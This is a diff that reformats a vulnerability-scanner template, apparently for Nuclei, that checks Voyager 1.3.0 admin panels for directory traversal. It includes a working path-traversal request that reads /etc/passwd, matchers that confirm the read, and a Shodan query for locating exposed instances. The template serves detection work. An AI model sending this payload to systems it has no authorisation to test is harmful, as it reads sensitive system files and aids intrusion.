@@ -1,4 +1,5 @@
 id: voyager-lfi
+
 info:
   name: Voyager 1.3.0 - Directory Traversal
   author: mammad_rahimzada
@@ -12,26 +13,31 @@ info:
     cwe-id: CWE-22
     cpe: cpe:2.3:a:voyager_project:voyager:*:*:*:*:*:*:*:*
   metadata:
-    max-request: 1
-    product: voyager
-    shodan-query: html:"voyager-assets"
-    vendor: voyager_project
     verified: true
-  tags: lfi,voyager,vuln
+    max-request: 1
+    shodan-query: html:"voyager-assets"
+    product: voyager
+    vendor: voyager_project
+  tags: voyager,lfi,vuln
+
 http:
-  - matchers:
-      - part: body
-        regex:
-          - 'root:.*:0:0:'
-        type: regex
-      - part: header
-        type: word
-        words:
-          - text/plain
-      - status:
-          - 200
-        type: status
-    matchers-condition: and
-    method: GET
+  - method: GET
     path:
-      - '{{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd'
+      - "{{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100f66fdd87458f04e80ae9c852fecdf298fc32b6dafd96171c757e55ce93f29aba022100f7a3a9f5abf6c448aa1dd614bc760cd72fca9c1a8e8b7e1030a9c483259890d7:922c64590222798bb761d5b6d8e72950
